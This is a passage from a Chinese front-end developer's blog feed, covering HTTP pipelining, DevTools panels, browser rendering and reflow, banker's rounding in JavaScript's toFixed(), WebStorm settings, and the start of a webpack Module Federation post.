src="/Blog/2021/08/27/javascript/Web%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96-%E4%BB%80%E4%B9%88%E6%98%AF%E8%BF%9E%E6%8E%A5%E5%A4%8D%E7%94%A8/index/img.png"></p><blockquote><p>相同的 id 代表连接复用</p></blockquote><h2 id="HTTP-管道化"><a href="#HTTP-管道化" class="headerlink" title="HTTP 管道化"></a>HTTP 管道化</h2><blockquote><p>浏览器默认关闭，可能会有 BUG</p></blockquote><p>🌰：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|<span class="string">一个 http 管道-------------------------</span></span><br><span class="line"><span class="string"></span>||<span class="string"> 1.css ----- 响应</span></span><br><span class="line"><span class="string"></span>|<span class="string"> </span>|<span class="string"> 2.css ----- 响应</span></span><br><span class="line"><span class="string"></span>|<span class="string">  </span>|<span class="string"> 3.css ----- 响应</span></span><br><span class="line"><span class="string"></span>|<span class="string">--------------------------------------</span></span><br></pre></td></tr></table></figure><blockquote><p>当在管道中发起（接近同时）三个请求时，会有如下问题：</p><ol><li>浏览器必须要按照相当的顺序返回响应，否则会对应不上，不像并行一样，每次都是新的连接一一对应。</li><li>如果 1.css 因为网络波动特别慢，那么 剩下的必须得等 1.css 响应结束才可以继续，因为一旦 2.css 提前响应了就会被浏览器错误的当成 1.css 的响应。<br>所以他会导致请求之前的顺序依赖，导致这样的并行没法导致最快的速度，所以一开始的 http 设计并不能满足现在的需求，所以需要升级为 HTTP&#x2F;2.0</li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浏览器工具篇</title>
      <link href="/Blog/2021/08/24/javascript/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E5%85%B7%E7%AF%87/index/"/>
      <url>/Blog/2021/08/24/javascript/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E5%85%B7%E7%AF%87/index/</url>
      
        <content type="html"><![CDATA[<h2 id="Performance-面板"><a href="#Performance-面板" class="headerlink" title="Performance 面板"></a>Performance 面板</h2><p>一般点击录制，刷新页面就好了，但是：</p><p>小技巧：</p><ol><li>先清空 document</li><li>再点击录制</li><li>然后刷新页面</li><li>结束录制</li><li>这样分析起来比较好看</li></ol><h4 id="怎么看结果？"><a href="#怎么看结果？" class="headerlink" title="怎么看结果？"></a>怎么看结果？</h4><blockquote><p>主要看图里面的小山，选中该区域<br>network 没啥好看的，和外面的差不多<br>主要看 main，看脚本执行的性能</p></blockquote><p><img src="/Blog/2021/08/24/javascript/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E5%85%B7%E7%AF%87/index/img.png"></p><p>如图，从上往下就是某一次的调用，<br>点击即可看到每块运行的那个 js，</p><h6 id="怎么看哪里性能有问题？"><a href="#怎么看哪里性能有问题？" class="headerlink" title="怎么看哪里性能有问题？"></a>怎么看哪里性能有问题？</h6><p>如果一个很内部（底下）的函数调用的时间很长，说明这个函数需要被优化。</p><h2 id="Rendering-面板"><a href="#Rendering-面板" class="headerlink" title="Rendering 面板"></a>Rendering 面板</h2><blockquote><p>在控制面板上按下 esc 键呼出，如果还是没有，点击“三个点”找到打钩就能显示出来了</p><p>最常用的就是绘制闪烁（paint flashing），他会在页面变化的内容更加明显的显示出来</p><p>最常用的还有帧率渲染统计（frame rendering stats），页面的左上角就会出现一个小框，在滚动页面的时候，看帧率如果低于30就很卡，30以上就还行。</p></blockquote><h2 id="Coverage-面板"><a href="#Coverage-面板" class="headerlink" title="Coverage 面板"></a>Coverage 面板</h2><blockquote><p>查看代码的使用率</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浏览器渲染原理</title>
      <link href="/Blog/2021/08/22/javascript/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/index/"/>
      <url>/Blog/2021/08/22/javascript/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/index/</url>
      
        <content type="html"><![CDATA[<p><img src="/Blog/2021/08/22/javascript/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/index/img.png"></p><h2 id="浏览器的组成"><a href="#浏览器的组成" class="headerlink" title="浏览器的组成"></a>浏览器的组成</h2><p>从输入网址之后，浏览器会调用自己的核心功能，他会去调用网络模块，得到网页之后，就调用到渲染引擎，渲染引擎就会开始呈现页面，如果遇到了 JS，会先用网络模块下载 JS，然后让 JS 解释器执行这个 JS。<br>对于前端来必须关注 <strong>渲染引擎，JS解释器，网络模块</strong> 的基本原理</p><p><img src="/Blog/2021/08/22/javascript/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/index/img_1.png"></p><h2 id="HTML-的解析过程"><a href="#HTML-的解析过程" class="headerlink" title="HTML 的解析过程"></a>HTML 的解析过程</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// index.html</span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">-</span>&gt;</span> CSS&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>helll world<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">-</span>&gt;</span><span class="language-javascript"> <span class="variable constant_">JS</span>&gt;</span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>more...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><p>对应的解析过程</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">|<span class="string">下载 HTML</span></span><br><span class="line"><span class="string"></span>|<span class="string">--</span>|<span class="string">解析 HTML -- 构建 DOM 树，并不是直接渲染</span></span><br><span class="line"><span class="string"></span>|<span class="string">--</span>|<span class="string">--</span>|<span class="string">下载 CSS</span></span><br><span class="line"><span class="string"></span>|<span class="string">--</span>|<span class="string">--</span>|<span class="string">--</span>|<span class="string">解析 CSS -- 构建 CSS 树</span></span><br><span class="line"><span class="string"></span>|<span class="string">--</span>|<span class="string">--</span>|<span class="string">--</span>|<span class="string">--</span>|<span class="string">下载JS -- 当这里遇到 JS 的时候会中断 HTML的解析</span></span><br><span class="line"><span class="string"></span>|<span class="string">--</span>|<span class="string">--</span>|<span class="string">--</span>|<span class="string">--</span>|<span class="string">--</span>|<span class="string">执行 JS -- 直至 JS 执行完毕</span></span><br></pre></td></tr></table></figure><blockquote><p>这里有个疑问，是完全下载完以后再解析还是边下载边解析？<br>答案是不知道，这个没有文档规定，每个浏览器都可以按自己的理解去实现。</p></blockquote><h3 id="HTML-和-JS"><a href="#HTML-和-JS" class="headerlink" title="HTML 和 JS"></a>HTML 和 JS</h3><blockquote><p>为什么 JS 的下载和执行，会阻塞 HTML？<br>原因是 JS 的执行可能会修改到 DOM 树，所以必须等待 JS 执行完，但是为什么下载也会阻塞呢？因为过去的浏览器“偷懒了”，有没那么强大，只会在看到这行 script 的时候，才会去下载，所以一旦开始下载就必须等待他解析完毕。&gt;但是这个事情可以优化的，他可以去下载过程提前，拿到文档之前，先扫描一遍，有 CSS、JS就提前开始下载，但在早期为什么不这么实现呢？因为比如上述四行代码，这个执行过程是很快的，例如只有 1ms，再怎么提前开始下载也就只节约了这 1ms，而下载时间可能有 100ms，即使做了这个优化，也只是把 100ms 优化成了 99ms，意义不大，所以早期浏览器就没有做。</p></blockquote><h5 id="async-与-defer-的区别"><a href="#async-与-defer-的区别" class="headerlink" title="async 与 defer 的区别"></a>async 与 defer 的区别</h5><p><img src="/Blog/2021/08/22/javascript/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/index/img_2.png"></p><ol><li>普通的 script，就是下载和执行都会阻塞 HTML 解析。</li><li>async 就是遇到 script 时，就开始下载，什么时候下载完就什么时候开始执行，仿佛脱离了主分支，使结构更加松散。</li><li>而 defer 也是解析到 script 时，就开始下载，但是会等待 HTML 解析完毕之后、DOM ready 之前，开始执行。</li></ol><p><img src="/Blog/2021/08/22/javascript/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/index/img_3.png"></p><blockquote><p>这里的 module 几乎和 defer 差不多，只不过多了一些分支下载，执行依旧在 HTML 解析完毕以后</p></blockquote><h3 id="HTML-和-CSS"><a href="#HTML-和-CSS" class="headerlink" title="HTML 和 CSS"></a>HTML 和 CSS</h3><p>什么影响，可以同时进行，HTML可以边解析，边下载和构建 CSS。</p><h3 id="CSS-和-JS"><a href="#CSS-和-JS" class="headerlink" title="CSS 和 JS"></a>CSS 和 JS</h3><h4 id="CSS的下载和解析会阻塞-JS-的执行"><a href="#CSS的下载和解析会阻塞-JS-的执行" class="headerlink" title="CSS的下载和解析会阻塞 JS 的执行"></a>CSS的下载和解析会阻塞 JS 的执行</h4><blockquote><p>因为 JS 需要读取 CSS 的结果，假设上述代码的第一行 &lt;link -&gt; CSS&gt; 有 100M，文件的最后一行写了 h1 {height: 999px;}<br>当下面在执行 JS 的时候获取 h1 的高度应该是多少？<br>很容易就能推出是 999px，所以肯定是等 CSS 下载和执行完毕才会去执行 JS。</p></blockquote><h2 id="页面渲染原理：布局、绘制、合成"><a href="#页面渲染原理：布局、绘制、合成" class="headerlink" title="页面渲染原理：布局、绘制、合成"></a>页面渲染原理：布局、绘制、合成</h2><p><img src="/Blog/2021/08/22/javascript/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/index/img_4.png"></p><h3 id="DOM-树"><a href="#DOM-树" class="headerlink" title="DOM 树"></a>DOM 树</h3><p><img src="/Blog/2021/08/22/javascript/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/index/img_5.png" alt="HTML结构"></p><p><img src="/Blog/2021/08/22/javascript/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/index/img_6.png" alt="生成的 DOM 树"></p><h3 id="CSS-树"><a href="#CSS-树" class="headerlink" title="CSS 树"></a>CSS 树</h3><p><img src="/Blog/2021/08/22/javascript/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/index/img_7.png" alt="CSS 代码"></p><p><img src="/Blog/2021/08/22/javascript/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/index/img_8.png" alt="生成的 CSS 树"></p><blockquote><p>CSS 树和 DOM 树并无关联（DOM 树不知道样式，CSS 树不知道DOM结构），即使 HTML 结构中没有 h1、h2 标签，但是 CSS 树中依然会构建出 h1、h2，所以必须合成一个渲染树</p></blockquote><h3 id="render-树"><a href="#render-树" class="headerlink" title="render 树"></a>render 树</h3><p><img src="/Blog/2021/08/22/javascript/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/index/img_9.png" alt="渲染树 CSSOM"></p><blockquote><p>拿到 render tree 以后终于可以开始渲染了，但是并不能直接开始渲染，所以下一步就是布局。</p></blockquote><h3 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h3><blockquote><p>布局就是计算元素的大小和尺寸，接着就是绘制</p></blockquote><h3 id="绘制"><a href="#绘制" class="headerlink" title="绘制"></a>绘制</h3><blockquote><p>布局以后就知道要对那些元素（主要是当前屏幕内）进行着色和阴影这些个东西。</p></blockquote><h3 id="合成"><a href="#合成" class="headerlink" title="合成"></a>合成</h3><blockquote><p>最后一步就是合成，因为有些元素可能会重叠，比如说两个 div 重叠在一块，在计算颜色的时候，就要拍平、压扁，如：上面的 div 是红色的，下面是绿色的，拍扁以后，红色就会盖住绿色。<br>主要是把多层次的东西，合成一个层次，最终就可以输出在屏幕上，也就是用户看到的了。</p></blockquote><h2 id="如何判定-reflow-和-repaint"><a href="#如何判定-reflow-和-repaint" class="headerlink" title="如何判定 reflow 和 repaint"></a>如何判定 reflow 和 repaint</h2><blockquote><p>比如页面有上下两个 div，当用 JS 把上面的 div 高度增加时，就要重新去布局，<strong>重新布局就是 reflow</strong>，浏览器要重新计算位置，大小尺寸变化，一般来说大小变化，颜色也会发生改变，也就需要重新绘制，<strong>重新绘制就是 repaint</strong>，最后就是重新合成了（因为所有的改变都会触发重新合成，所以一般不讨论）。<br>有些属性会造成 reflow，有些属性会造成 repaint，一般来说需要一个一个实验才知道，但是可以直接用别人的 <a href="https://csstriggers.com/">成果</a><br>根据上述流程上图，一般来说造成了重新布局（reflow）就一定会触发重新绘制（repaint）</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>银行家舍入法</title>
      <link href="/Blog/2021/08/11/essay/%E9%93%B6%E8%A1%8C%E5%AE%B6%E8%88%8D%E5%85%A5%E6%B3%95/index/"/>
      <url>/Blog/2021/08/11/essay/%E9%93%B6%E8%A1%8C%E5%AE%B6%E8%88%8D%E5%85%A5%E6%B3%95/index/</url>
      
        <content type="html"><![CDATA[<h2 id="一句话介绍"><a href="#一句话介绍" class="headerlink" title="一句话介绍"></a>一句话介绍</h2><blockquote><p>四舍六入五考虑，五后非零就进一，五后为零看奇偶，五前为偶应舍去，五前为奇要进一。</p></blockquote><h2 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h2><p>一直以为 <code>JavaScript</code> 的 <code>toFixed()</code> 是四舍五入的，但今天却惊讶地发现：<strong>它并不是一直都会四舍五入的</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>.<span class="number">35</span>.toFixed(<span class="number">1</span>) // <span class="number">1</span>.<span class="number">4</span></span><br><span class="line"><span class="attribute">1</span>.<span class="number">45</span>.toFixed(<span class="number">1</span>) // <span class="number">1</span>.<span class="number">4</span></span><br></pre></td></tr></table></figure><p>为什么对于相同的尾数5的舍入，结果却不同呢？<br>因为 <code>toFixed()</code> 使用的是“银行家舍入法”</p><p>银行家舍入法是由 IEEE 754 标准规定的浮点数取整算法，大部分的编程软件都使用这种方法。</p><p>当舍去位的数值：</p><ul><li>小于等于4，直接舍去该位</li><li>大于等于6，向前位进一</li><li>等于5<ul><li>5后有数，向前位进一</li><li>5后全0<ul><li>5前位数值为奇，则向前位进一（将前位凑成偶）</li><li>5前位数值为偶，则直接舍去该位</li></ul></li></ul></li></ul><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><p>我们知道银行的盈利渠道主要是利息差，从储户手里收拢资金，然后放贷出去，其间的利息差额便是所获得的利润。对一个银行来说，对付给储户的利息的计算非常频繁。</p><p>假如我们使用四舍五入法，且假设银行收到的钱中，要舍入的那位数在0~9是等概率的，那么假设银行分别收到了 <code>0.000, 0.001, ..., 0.009</code> 元，然后通过四舍五入法，银行能够得到五个 <code>0.000</code> 和五个 <code>1.000</code>，也许在概率上看起来是公平的，但是：</p><h5 id="以银行家的身份来思考这个算法："><a href="#以银行家的身份来思考这个算法：" class="headerlink" title="以银行家的身份来思考这个算法："></a>以银行家的身份来思考这个算法：</h5><ul><li><p>（1）四舍：舍弃的数值：0.000、0.001、0.002、0.003、0.004，因为是舍弃，对银行家来说，就是不用付款给储户的，那每舍弃一个数字就会赚取相应的金额：0.000、0.001、0.002、0.003、0.004。</p></li><li><p>（2）五入：进位的数值：0.005、0.006、0.007、0.008、0.009，因为是进位，对银行家来说，每进一位就会多付款给储户，也就是亏损了，那亏损部分就是其对应的10进制补数：0.005、0.004、0.003、0.002、0.001</p></li></ul><p>因为舍弃和进位的数字是在0到9之间均匀分布的，所以对于银行家来说，每10笔存款的利息因采用四舍五入而获得的盈利是：<br><code>0.000 + 0.001 + 0.002 + 0.003 + 0.004 - 0.005 - 0.004 - 0.003 - 0.002 - 0.001 = -0.005</code><br>也就是说，每10笔的利息计算中就亏损0.005元，即每笔利息计算损失0.0005元</p><h2 id="问题：为什么银行家舍入是合理的？"><a href="#问题：为什么银行家舍入是合理的？" class="headerlink" title="问题：为什么银行家舍入是合理的？"></a>问题：为什么银行家舍入是合理的？</h2><ul><li>四舍六入本身没问题，5前偶舍奇进也没问题，关键在为什么5后有非0数要进位？</li><li>遇5舍弃的情况只有一种，即5是最后一位有效的数字且前一位数是偶数</li><li>当数值精度达到5后一位，其为0的概率为1&#x2F;10，5前为偶数的概率是1&#x2F;2，所以舍5的概率是1&#x2F;10 * 1&#x2F;2 &#x3D; 1&#x2F;20，而进5的概率是19&#x2F;20</li><li>当数值精度越大，舍5个概率就越低，无限趋近于0，也就是说，当数值精度越高，该算法越像“四舍五入”</li><li><strong>那么，为什么这个算法是合理的呢？</strong></li><li>现实情况就是数值的精度<strong>不可能无限大</strong>，存款利息率一般为百分之零点几，而数值精度一般4位，5后存在非0数的概率相对较小，所以趋近于1&#x2F;2舍5，1&#x2F;2进5</li></ul><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>说是 toFixed() 使用的银行家舍入法所以表现起来不是四舍五入，但是在 <code>Chrome</code> 浏览器的实测中，我注意到它也并不一定都符合银行家舍入法：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0</span>.<span class="number">45</span>.toFixed(<span class="number">1</span>) // <span class="number">0</span>.<span class="number">5</span> 而不是<span class="number">0</span>.<span class="number">4</span></span><br><span class="line"><span class="attribute">1</span>.<span class="number">45</span>.toFixed(<span class="number">1</span>) // <span class="number">1</span>.<span class="number">4</span></span><br></pre></td></tr></table></figure><p>个人认为，这可能是由于<strong>浮点数存储精度</strong>问题导致的（未查阅资料证实）。</p><p>比如这里的 <strong>0.45其实类似于0.4500000002</strong>，存在一点点尾数，所以进行了舍入变为0.5。</p><p>有人认为因此在严肃的情况下不应使用 toFixed()，不过我个人倒是认为误差是随机的，所以从概率而言最后得到的结果还是公平的。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WebStorm 配置</title>
      <link href="/Blog/2021/07/28/essay/WebStorm%E9%85%8D%E7%BD%AE/index/"/>
      <url>/Blog/2021/07/28/essay/WebStorm%E9%85%8D%E7%BD%AE/index/</url>
      
        <content type="html"><![CDATA[<h2 id="如何让-WebStorm-的界面变美观"><a href="#如何让-WebStorm-的界面变美观" class="headerlink" title="如何让 WebStorm 的界面变美观"></a>如何让 WebStorm 的界面变美观</h2><p>步骤</p><ol><li>将用不到的界面隐藏起来，操作方法：View &#x3D;&gt; Appearance &#x3D;&gt; 勾选如下</li></ol><p><img src="/Blog/2021/07/28/essay/WebStorm%E9%85%8D%E7%BD%AE/index/img.png"></p><ol start="3"><li>改变以下选项</li></ol><p><img src="/Blog/2021/07/28/essay/WebStorm%E9%85%8D%E7%BD%AE/index/img_1.png"></p><h2 id="如何让-WebStorm-里的代码变好看"><a href="#如何让-WebStorm-里的代码变好看" class="headerlink" title="如何让 WebStorm 里的代码变好看"></a>如何让 WebStorm 里的代码变好看</h2><p>步骤</p><ol><li>选择一个好看的字体配色，打开设置 &#x3D;&gt; Editor &#x3D;&gt; Color Scheme，选择一个你喜欢的配色，点击 OK，就可以预览这个配色了。我个人喜欢 Molokai 或者默认的 Darcula 配色。</li><li>将字体设置为 JetBrains Mono、Source Code Pro 或者 Fira Code，方法为：打开 Editor &#x3D;&gt; Font，然后如下图所示设置一下</li></ol><p><img src="/Blog/2021/07/28/essay/WebStorm%E9%85%8D%E7%BD%AE/index/img_2.png"></p><ol start="3"><li>注意把 Fallback 字体设置为 Microsoft Yahei 之类的中文字体。</li></ol><ul><li>还有两处字体需要设置一下，分别是</li><li>进入 Editor &#x3D;&gt; Color Scheme &#x3D;&gt; Color Scheme Font，取消勾选 Use color scheme font instead of …</li><li>进入 Editor &#x3D;&gt; Color Scheme &#x3D;&gt; Console Font，取消勾选 Use color scheme font instead of …</li><li>点击保存，这样一来，所有字体就统一了。</li></ul><h2 id="WebStorm-快捷键-＆-Git-快捷操作"><a href="#WebStorm-快捷键-＆-Git-快捷操作" class="headerlink" title="WebStorm 快捷键 ＆ Git 快捷操作"></a>WebStorm 快捷键 ＆ Git 快捷操作</h2><h4 id="查看快捷键"><a href="#查看快捷键" class="headerlink" title="查看快捷键"></a>查看快捷键</h4><p>在 WebStorm 里查看快捷键很简单：</p><ol><li>按两下 Shift，没错，按两下，你会得到一个搜索框，这个搜索框可以搜索任何东西</li><li>在搜索框里输入你想要的功能名称，比如 reformat （代码格式化），然后你就看到对应的操作（Action）</li><li>Action 后面就跟着对应的快捷键</li></ol><p><img src="/Blog/2021/07/28/essay/WebStorm%E9%85%8D%E7%BD%AE/index/img_3.png"></p><p>不过这个方式的缺点是只能搜英文，所以可以看第二个方式：查看菜单栏，快捷键就写在菜单栏每一项 Action 的后面</p><p><img src="/Blog/2021/07/28/essay/WebStorm%E9%85%8D%E7%BD%AE/index/img_4.png"></p><h4 id="修改快捷键"><a href="#修改快捷键" class="headerlink" title="修改快捷键"></a>修改快捷键</h4><p>在 Settings 里的 keymap 里的搜索栏搜索即可，见下图</p><p><img src="/Blog/2021/07/28/essay/WebStorm%E9%85%8D%E7%BD%AE/index/img_5.png"></p><p>如果修改后提示快捷键有冲突，点击 Remove 即可把其他冲突的快捷键删除。</p><h4 id="常见设置"><a href="#常见设置" class="headerlink" title="常见设置"></a>常见设置</h4><p>我一般会设置这么几个快捷键</p><ol><li>查找文件，设置为 Ctrl + P（mac 用户自动将 Ctrl 脑补成 cmd 键吧）</li></ol><p><img src="/Blog/2021/07/28/essay/WebStorm%E9%85%8D%E7%BD%AE/index/img_6.png"></p><ol start="2"><li>项目文件列表窗口，设置为 Alt + 1，这样任何时候你都可以显示或关闭项目文件列表</li></ol><p><img src="/Blog/2021/07/28/essay/WebStorm%E9%85%8D%E7%BD%AE/index/img_7.png"></p><ol start="3"><li>终端窗口，设置为 Alt + 2，这样你任何时候都可以打开终端输入命令行了（见上图）</li><li>Git 窗口（上图中最下方的 Version Control 就是指 Git），设置为 Alt + 3（当然你可以改），前提是你的项目已经在终端里运行过 git init，这个窗口操作 git 非常方便（不过我个人更喜欢用命令行）</li></ol><p><img src="/Blog/2021/07/28/essay/WebStorm%E9%85%8D%E7%BD%AE/index/img_8.png"></p><p>你可以有最左边的快捷按钮，也可以在 App.vue 文件上面右键，查看更多细节操作。<br>点击左侧小飞机按钮提交代码的时候，有很多选项，见下图</p><p><img src="/Blog/2021/07/28/essay/WebStorm%E9%85%8D%E7%BD%AE/index/img_9.png"></p><ol start="5"><li>关闭当前窗口，设置为 Ctrl + W，这是一个常用快捷键，设置完之后提示冲突，此时请点击 Remove</li></ol><p><img src="/Blog/2021/07/28/essay/WebStorm%E9%85%8D%E7%BD%AE/index/img_10.png"></p><ol start="6"><li>在 Keymap 里将 Main Menu &#x3D;&gt; Edit &#x3D;&gt; Extend Selection 设为 Alt + W，将 Main Menu &#x3D;&gt; Edit &#x3D;&gt; Shrink Selection 设为 Alt + Shift + W，这两个快捷键自己试试，非常有用。</li><li>加强 Emmet，如下图</li></ol><p><img src="/Blog/2021/07/28/essay/WebStorm%E9%85%8D%E7%BD%AE/index/img_11.png"></p><ol start="9"><li>撤销与重做。撤销的默认快捷键是 Ctrl + Z，不需要改；但是重做的默认快捷键是 Ctrl + Shift + Z，建议在 keymap 里把给 redo 添加一个快捷键 Ctrl + Y（提示冲突就选择 Remove）</li></ol><p>最后，如果你忘了快捷键，就用万能快捷键 Shift Shift 来搜索即可。</p><h2 id="WebStorm-格式化代码"><a href="#WebStorm-格式化代码" class="headerlink" title="WebStorm 格式化代码"></a>WebStorm 格式化代码</h2><h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p>在任意 JS 文件，使用 Show Reformat File Dialog 功能（快捷键你要自己用 Shift Shift 搜索一下），会弹出一个对话框</p><p><img src="/Blog/2021/07/28/essay/WebStorm%E9%85%8D%E7%BD%AE/index/img_12.png"></p><p>我们一般选择 Whole file 来格式化整个文件，但如果当前文件是别人的代码，你可能就要选择 Only VCS changed text，以防修改别的人代码，只格式化刚写的代码。</p><p>你可以在任何时候使用 Show Reformat File Dialog 功能重新弹出这个对话框进行修改配置。</p><h4 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h4><p>使用 Reformat Code 功能（快捷键你要自己用 Shift Shift 搜索一下），就会立即格式化当前文件。</p><p>如果你对格式化后的文件不满意，那么</p><ol><li>在设置里选中 Editor &#x3D;&gt; Code Style &#x3D;&gt; TypeScript进行自定义（JavaScript同理），可以看我下面用红色箭头推荐的配置</li></ol><p><img src="/Blog/2021/07/28/essay/WebStorm%E9%85%8D%E7%BD%AE/index/img_13.png"></p><p><img src="/Blog/2021/07/28/essay/WebStorm%E9%85%8D%E7%BD%AE/index/img_14.png"></p><p><img src="/Blog/2021/07/28/essay/WebStorm%E9%85%8D%E7%BD%AE/index/img_15.png"></p><p>可选：个人建议把 JS、CSS、SCSS、TypeScript、HTML 代码缩进全改成 2、2、2，这样代码更紧凑。建议 JS 不加分号，TS 加分号。</p><h2 id="可选：其他-WebStorm-选项"><a href="#可选：其他-WebStorm-选项" class="headerlink" title="可选：其他 WebStorm 选项"></a>可选：其他 WebStorm 选项</h2><p>开启以下功能（直接在 Shift Shift 后输入对应的英文即可开启，找不到不要来问我，因为这些选项都无关紧要）：</p><ul><li>Show tree indent guides，这个功能会在编辑器里添加竖线，方便代码对齐。</li><li>Show method separators，这个功能会在每个方法上面添加横线，便于阅读代码。</li><li>Breadcrumbs，搜索这个选项，然后选择 Dont’t Show，用于隐藏面包屑（如下图），你也可以右键点击面包屑查看更多选项</li></ul><p><img src="/Blog/2021/07/28/essay/WebStorm%E9%85%8D%E7%BD%AE/index/img_16.png"></p><ul><li><p>Show CSS color preview as background，我个人喜欢开启这个功能<br>关闭以下功能（直接在 Shift Shift 后输入对应的英文即可关闭）：</p></li><li><p>Show gutter icons，关闭此功能可能让编辑器更简洁<br>一些可能用到的功能</p></li><li><p>Soft wrap，用于折行</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>在 vue/cli 中使用 Module Federation</title>
      <link href="/Blog/2021/06/22/essay/%E5%9C%A8vue-cli%E4%B8%AD%E4%BD%BF%E7%94%A8-Module-Federation/index/"/>
      <url>/Blog/2021/06/22/essay/%E5%9C%A8vue-cli%E4%B8%AD%E4%BD%BF%E7%94%A8-Module-Federation/index/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>webpack5 的新特性，分模块共同开发</p><ul><li>所需环境: webpack v5 以上，由于我们用的是 vue-cli，所以需要升级 @vue&#x2F;cli 到 v5 以上版本。</li><li>任何框架都可以使用</li></ul><h2 id="动机"><a href="#动机" class="headerlink" title="动机"></a>动机</h2><p>多个独立的构建可以组成一个应用程序，这些独立的构建之间不应该存在依赖关系，因此可以单独开发和部署它们。</p><p>这通常被称作微前端，但并不仅限于此。</p><h2 id="底层概念"><a href="#底层概念" class="headerlink" title="底层概念"></a>底层概念</h2><p>我们分为本地模块、远程模块。</p><p>其中本地模块即为普通模块，是当前构建的一部分；而远程模块不属于当前构建，并在运行时从所谓的容器加载。</p><p>加载远程模块被认为是异步操作。当使用远程模块时，这些异步操作将被放置在远程模块和入口之间的下一个chunk的加载操作中。如果没有chunk加载操作，就不能使用远程模块。</p><p>chunk的加载操作通常是通过调用import()实现的，但也支持像 require.ensure或require([…])之类的旧语法。</p><p>容器是由容器入口创建的，该入口暴露了对特定模块的异步访问。暴露的访问分为两个步骤：</p><p>步骤1：加载模块（异步的）</p><p>步骤2：执行模块（同步的）</p><p>步骤1将在chunk加载期间完成。步骤2将在与其他（本地和远程）的模块交错执行期间完成。这样一来，执行顺序不受模块从本地转换为远程或从远程转为本地的影响。</p><p>容器可以嵌套使用，容器可以使用来自其他容器的模块。容器之间也可以循环依赖。</p><hr><h2 id="使用只需以下几个步骤"><a href="#使用只需以下几个步骤" class="headerlink" title="使用只需以下几个步骤"></a>使用只需以下几个步骤</h2><h4 id="home-项目"><a href="#home-项目" class="headerlink" title="home 项目"></a>home 项目</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 